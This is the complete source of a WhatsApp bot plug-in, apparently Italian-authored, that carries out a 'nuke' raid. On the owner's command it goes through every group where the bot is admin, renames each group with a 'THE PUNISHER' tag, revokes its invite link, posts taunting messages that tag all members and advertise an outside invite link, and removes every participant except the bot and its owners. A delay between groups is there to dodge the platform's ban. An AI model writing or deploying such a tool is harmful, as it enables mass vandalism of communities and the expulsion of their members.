// Plug-in Global Nuke creato da elixir
// Comandi: .bombanucleare, .autodistruzione

let handler = async (m, { conn, text, usedPrefix, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // Sistema di sicurezza: Richiede conferma per evitare attivazioni accidentali
    if (!text || text.toLowerCase() !== 'conferma') {
        return await m.reply(`⚠️ *ATTENZIONE: PROTOCOLLO DI DISTRUZIONE* ⚠️\n\nStai per avviare il nuke in *TUTTI* i gruppi in cui il bot è admin.\n\nPer procedere, digita:\n*${usedPrefix + command} conferma*`);
    }

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    
    // Recupero di tutti i gruppi
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    await m.reply(`☢️ *Protocollo "${command.toUpperCase()}" in corso...*\nEsecuzione su ${groups.length} gruppi.`);

    for (let group of groups) {
        try {
            let groupId = group.id;
            
            // Otteniamo i metadati del gruppo
            let groupMetadata = await conn.groupMetadata(groupId).catch(() => null);
            if (!groupMetadata) continue;

            let participantsList = groupMetadata.participants;
            
            // Verifica se il bot è admin
            let botInGroup = participantsList.find(p => p.id === botId);
            if (!botInGroup || (!botInGroup.admin && !botInGroup.ismadmin)) continue;

            // 1. 🔹 CAMBIO NOME GRUPPO
            try {
                let oldName = groupMetadata.subject;
                await conn.groupUpdateSubject(groupId, `${oldName} | SVT BY 𝚃𝙷𝙴 𝙿𝚄𝙽𝙸𝚂𝙷𝙴𝚁`);
            } catch (e) { console.error('Errore nome:', groupId) }

            // 2. 🔹 RESET LINK
            let newInviteLink = 'https://chat.whatsapp.com/HMxI7HksDxzE98uE4MiIDo'; 
            try {
                await conn.groupRevokeInvite(groupId);
                await conn.groupInviteCode(groupId);
            } catch (e) { console.error('Errore link:', groupId) }

            // 3. 🔹 FILTRO UTENTI (Esclude Bot e Owners)
            let usersToRemove = participantsList
                .map(p => p.id)
                .filter(jid => 
                    jid && 
                    jid !== botId && 
                    !ownerJids.includes(jid)
                );

            if (usersToRemove.length > 0) {
                // Messaggi estetici
                await conn.sendMessage(groupId, {
                    text: "𝗧𝗵𝗲 𝗽𝘂𝗻𝗶𝘀𝗵𝗲𝗿 𝗵𝗮 𝘀𝘁𝗮𝗯𝗶𝗹𝗶𝘁𝗼 𝘂𝗻 𝗻𝘂𝗼𝘃𝗼 𝗼𝗿𝗱𝗶𝗻𝗲. 𝐐𝐮𝐞𝐬𝐭𝐨 𝐥𝐮𝐨𝐠𝐨 𝐡𝐚 𝐞𝐬𝐚𝐮𝐫𝐢𝐭𝐨 𝐢𝐥 𝐬𝐮𝐨 𝐬𝐜𝐨𝐩𝐨."
                });

                await conn.sendMessage(groupId, {
                    text: `𝐋𝐚 𝐬𝐞𝐥𝐞𝐳𝐢𝐨𝐧𝐞 𝐞̀ 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐚. 𝐒𝐨𝐥𝐨 𝐜𝐡𝐢 𝐞̀ 𝐝𝐞𝐠𝐧𝐨 𝐩𝐮𝐨̀ 𝐩𝐫𝐨𝐬𝐞𝐠𝐮𝐢𝐫𝐞 𝐢𝐥 𝐯𝐢𝐚𝐠𝐠𝐢𝐨.\n\n${newInviteLink}`,
                    mentions: participantsList.map(p => p.id)
                });

                // 4. 🔹 RIMOZIONE MASSIVA
                await conn.groupParticipantsUpdate(groupId, usersToRemove, 'remove');
            }

            // Delay di sicurezza (3 secondi) per proteggere il numero dal ban immediato
            await new Promise(resolve => setTimeout(resolve, 3000));

        } catch (err) {
            console.error(`Errore nel gruppo ${group.id}:`, err);
        }
    }
    
    await m.reply("🔚 *OPERAZIONE COMPLETATA.*");
};

handler.command = ['bombanucleare', 'autodistruzione'];
handler.owner = true; 

export default handler;
